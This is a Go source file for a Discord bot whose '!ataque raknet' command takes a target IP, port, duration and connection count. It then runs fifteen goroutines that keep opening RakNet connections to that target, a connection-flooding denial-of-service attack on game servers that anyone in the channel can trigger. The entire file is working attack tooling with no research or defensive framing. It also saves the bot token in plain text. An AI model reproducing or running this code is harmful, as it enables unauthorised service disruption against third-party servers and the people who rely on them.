package main

import (
	"bufio"
	"fmt"
	"github.com/bwmarrin/discordgo"
	"github.com/sandertv/go-raknet"
	"github.com/sirupsen/logrus"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

var (
	Token string
)

var mu sync.Mutex
var connId = 0
var connections = map[int]*raknet.Conn{}
var log = logrus.New()
var target string
var maxConn = 1
var attackDuration time.Duration

func main() {
	log.Formatter = &logrus.TextFormatter{ForceColors: true}

	// Get token and save to file
	err := getToken()
	if err != nil {
		log.Fatalf("Error getting token: %v", err)
		return
	}

	// Create a new Discord session using the provided bot token.
	dg, err := discordgo.New("Bot " + Token)
	if err != nil {
		log.Fatalf("Error creating Discord session: %v", err)
		return
	}

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreate)

	// Only care about receiving message events.
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		log.Fatalf("Error opening connection: %v", err)
		return
	}

	// Wait here until CTRL-C or other term signal is received.
	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	// Cleanly close down the Discord session.
	dg.Close()
}

func getToken() error {
	// Attempt to read the token from token.txt
	token, err := readTokenFromFile("token.txt")
	if err == nil && token != "" {
		Token = token
		fmt.Println("Token read from token.txt")
		return nil
	}

	// If it doesn't exist or is empty, request it from the user.
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Please enter the Discord bot token: ")
	token, _ = reader.ReadString('\n')
	token = strings.TrimSpace(token)

	if token == "" {
		return fmt.Errorf("no token provided")
	}

	// Save the token to token.txt
	err = saveTokenToFile("token.txt", token)
	if err != nil {
		log.Printf("Warning: Failed to save token to token.txt: %v", err)
	}

	Token = token
	return nil
}

func readTokenFromFile(filename string) (string, error) {
	file, err := os.ReadFile(filename)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(file)), nil
}

func saveTokenToFile(filename string, token string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(token)
	return err
}

// This function will be called (due to AddHandler above) every time a new
// message is created on any channel that the authenticated bot has access to.
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore all messages created by the bot itself
	// This isn't required in every example, but it's a good practice.
	if m.Author.ID == s.State.User.ID {
		return
	}

	// Split the message into command and arguments
	parts := strings.Split(m.Content, " ")

	// Check if the message starts with the "!ataque raknet" command
	if len(parts) >= 5 && parts[0] == "!ataque" && parts[1] == "raknet" {
		ip := parts[2]
		portStr := parts[3]
		timeStr := parts[4]

		port, err := strconv.Atoi(portStr)
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "Invalid port number. Please provide a valid integer.")
			return
		}

		duration, err := strconv.Atoi(timeStr)
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "Invalid duration. Please provide a valid integer for the attack duration in seconds.")
			return
		}
		attackDuration = time.Duration(duration) * time.Second

		// Use maxConn from message
		if len(parts) > 5 {
			maxStr := parts[5]
			maxInt, err := strconv.Atoi(maxStr)
			if err != nil {
				s.ChannelMessageSend(m.ChannelID, "Invalid max connections. Using default max connections (1).")
			} else {
				maxConn = maxInt
			}
		}

		target = ip + ":" + strconv.Itoa(port)

		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Initiating RakNet attack on %s for %d seconds with %d connections...", target, duration, maxConn))

		// Capture the session to ensure it's available inside createConn
		go func(sess *discordgo.Session) {
			attackTimer := time.NewTimer(attackDuration)
			done := make(chan bool)

			for i := 0; i < 15; i++ {
				i := i
				go func() {
					for {
						select {
						case <-attackTimer.C:
							log.Infof("Attack duration complete for routine %d", i)
							done <- true
							return
						default:
							err := createConn(i, sess, m.ChannelID)
							if err != nil {
								log.Error(err)
								continue
							}
						}
					}
				}()
			}

			time.Sleep(attackDuration) // Allow time for goroutines to complete or timeout
			s.ChannelMessageSend(m.ChannelID, "RakNet attack completed.")

			// Close all connections and exit
			mu.Lock()
			for id, conn := range connections {
				if conn != nil {
					conn.Close()
					log.Infof("Closed connection %d", id)
				}
				delete(connections, id)
			}
			mu.Unlock()
		}(s) // Pass Discord session to goroutine
	}
}

func createConn(t int, s *discordgo.Session, channelID string) error {
	for len(connections) >= maxConn {
		time.Sleep(time.Second * 5)
	}

	log.Infof("[%d] Creating connection to %s...", t, target)
	conn, err := raknet.Dial(target)
	if err != nil {
		return err
	}
	mu.Lock()
	connId++
	cId := connId
	connections[cId] = conn
	log.Infof("[%d] Created connection %s [%d]", t, conn.RemoteAddr(), len(connections))
	mu.Unlock()
	go func(sess *discordgo.Session) {
		for {
			_, err := conn.ReadPacket()
			if err != nil {
				log.Error(err)
				_ = conn.Close()

				mu.Lock()
				delete(connections, cId)
				log.Infof("Closed %s", conn.RemoteAddr())
				mu.Unlock()

				// Notify Discord of connection closure (optional)
				sess.ChannelMessageSend(channelID, fmt.Sprintf("Connection %d closed: %v", cId, err))
				return
			}
			time.Sleep(time.Millisecond * 100)
		}
	}(s) // Pass Discord session to goroutine
	return nil
}
